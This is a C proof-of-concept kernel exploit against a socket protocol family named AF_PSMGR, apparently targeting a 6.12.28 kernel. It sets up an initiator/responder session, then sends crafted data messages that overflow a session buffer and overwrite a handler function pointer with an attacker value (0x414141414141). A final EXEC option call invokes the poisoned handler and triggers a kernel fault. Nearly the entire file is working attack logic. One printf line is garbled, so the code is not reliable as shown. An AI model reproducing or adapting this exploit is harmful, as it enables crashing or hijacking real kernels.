#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <fcntl.h>

#define AF_PSMGR              46
#define PSMGR_SOL             282
#define PSMGR_OPT_SET_ROLE    1
#define PSMGR_OPT_NEGO_1      2
#define PSMGR_OPT_NEGO_2      3
#define PSMGR_OPT_EXEC        6
#define PSMGR_OPT_GET_SESSION 9
#define PSMGR_ROLE_INITIATOR  0x02
#define PSMGR_ROLE_RESPONDER  0x03
#define PSMGR_CLASS_EXTENDED  0x02
#define PSMGR_XFRM_WINDOW     0x02
#define PSMGR_MODE_INTERLEAVE 0x02
#define PSMGR_MSG_DATA        0x05
#define PSMGR_MSG_COMMIT_REQ  0x03
#define PSMGR_BUF_WRITE_THRESH 48

struct sockaddr_psmgr { uint16_t spsmgr_family; uint32_t spsmgr_id; };
struct psmgr_msghdr { uint8_t msg_type; uint8_t session_id_lo; uint16_t payload_len; uint32_t seq; };
struct psmgr_nego_1 { uint8_t enc_class; uint8_t xfrm_type; uint16_t reserved; };
/* 6.12.28 layout: reserved2 FIRST, then enc_mode */
struct psmgr_nego_2 { uint16_t reserved2; uint8_t enc_mode; uint8_t reserved; uint32_t proc_param; };

static int send_msg(int fd, uint8_t type, uint8_t id_lo, uint32_t seq,
                    const void *payload, uint16_t plen) {
    uint8_t buf[8 + 256];
    struct psmgr_msghdr h = {type, id_lo, plen, seq};
    memcpy(buf, &h, 8);
    if (plen && payload) memcpy(buf + 8, payload, plen);
    struct iovec iov = {buf, (size_t)(8 + plen)};
    struct msghdr m; memset(&m, 0, sizeof(m));
    m.msg_iov = &iov; m.msg_iovlen = 1;
    return sendmsg(fd, &m, 0);
}

int main(void) {
    int kmsg_fd = open("/dev/kmsg", O_WRONLY);

    int initiator = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (initiator < 0) { perror("socket initiator"); return 1; }
    int responder = socket(AF_PSMGR, SOCK_SEQPACKET, 0);
    if (responder < 0) { perror("socket responder"); return 1; }

    /* INITIATOR: SET_ROLE + NEGO_1 (WINDOW xfrm) */
    uint8_t role = PSMGR_ROLE_INITIATOR;
    if (setsockopt(initiator, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, 1) < 0)
        { perror("initiator set_role"); return 1; }
    struct psmgr_nego_1 n1 = {PSMGR_CLASS_EXTENDED, PSMGR_XFRM_WINDOW, 0};
    if (setsockopt(initiator, PSMGR_SOL, PSMGR_OPT_NEGO_1, &n1, sizeof(n1)) < 0)
        { perror("initiator nego1"); return 1; }

    /* RESPONDER: SET_ROLE + NEGO_2 (INTERLEAVE enc_mode, proc_param=64) */
    role = PSMGR_ROLE_RESPONDER;
    if (setsockopt(responder, PSMGR_SOL, PSMGR_OPT_SET_ROLE, &role, 1) < 0)
        { perror("responder set_role"); return 1; }
    /* 6.12.28: reserved2 first, enc_mode second */
    struct psmgr_nego_2 n2 = {0, PSMGR_MODE_INTERLEAVE, 0, 64};
    if (setsockopt(responder, PSMGR_SOL, PSMGR_OPT_NEGO_2, &n2, sizeof(n2)) < 0)
        { perror("responder nego2"); return 1; }

    /* Get responder session_id via getsockopt */
    uint32_t responder_id = 0;
    socklen_t sl = sizeof(responder_id);
    if (getsockopt(responder, PSMGR_SOL, PSMGR_OPT_GET_SESSION, &responder_id, &sl) < 0)
        { perror("get responder id"); return 1; }

    /* Bind responder */
    struct sockaddr_psmgr ba = {AF_PSMGR, responder_id};
    bind(responder, (struct sockaddr*)&ba, sizeof(ba));

    /* INITIATOR connect -> assembles ctx (WINDOW/INTERLEAVE/proc_param=64) */
    struct sockaddr_psmgr ca = {AF_PSMGR, responder_id};
    if (connect(initiator, (struct sockaddr*)&ca, sizeof(ca)) < 0)
        { perror("connect"); return 1; }

    uint32_t initiator_id = 0;
    sl = sizeof(initiator_id);
    if (getsockopt(initiator, PSMGR_SOL, PSMGR_OPT_GET_SESSION, &initiator_id, &sl) < 0)
        { perror("get initiator id"); return 1; }
    uint8_t id_lo = (uint8_t)(initiator_id & 0xFF);

    printf("[*] initiator_id=%u responder_id=%u out_offset=128\n", initiator_id, responder_id);

    /* Step 1: DATA @128, 4 bytes -> write_count = 48 (>= WRITE_THRESH=48) -> token installed */
    uint32_t wc = PSMGR_BUF_WRITE_THRESH;
    int r = send_msg(initiator, PSMGR_MSG_DATA, id_lo, 0, &wc, 4);
    printf("[*] step1 DATA(len=4, write_count=48) -> ret=%d errno=%d\n", r, errno);

    /* Step 2: token set, write_limit=144. DATA @128, 16 bytes -> overwrite write_count+token+handler */
    uint8_t p16[16];
    uint32_t v_wc  = PSMGR_BUF_WRITE_THRESH;
    uint32_t v_tok = 0xDEADBEEF;
    uint64_t v_handler = 0x0000414141414141ULL;
    memcpy(p16 + 0, &v_wc, 4);
    memcpy(p16 + 4, &v_tok, 4);
    memcpy(p16 + 8, &v_handler, 8);
    r = send_msg(initiator, PSMGR_MSG_DATA, id_lo, 1, p16, 16);
    printf("[*] step2 DATA(len=16, handler=0x%016llx) -> ret=%d errno=%d\n",
           (unsigned long long)v_handler, r, errno);

    /* Step 3: COMMIT_REQ -> handler already non-NULL, skips table lookup, keeps our pointer */
    uint8_t commit[8] = {0};
    r = send_msg(initiator, PSMGR_MSG_COMMIT_REQ, id_lo, 2, commit, 8);
    printf("[*] step3 COMMIT_REQ -> ret=%d errno=%d\n", r, errno);

    /* Step 4: EXEC -> calls poisoned handler -> kernel fault */
    if (kmsg_fd >= 0)
        dprintf(kmsg_fd, "PSMGR-POC: triggering exec on poisoned handler 0x%016llx\n",
                (unsigned long long)v_handler);
    printf("printf("token=0xdeadbeef handler_set=1\n"); fflush(stdout);
    printf("[*] step4 OPT_EXEC: invoking corrupted handler -> expect kernel fault\n");
    fflush(stdout);
    uint32_t tok = 0xDEADBEEF;
    r = setsockopt(initiator, PSMGR_SOL, PSMGR_OPT_EXEC, &tok, sizeof(tok));
    printf("[*] exec returned ret=%d errno=%d (if here, no fault)\n", r, errno);
    return 0;
}

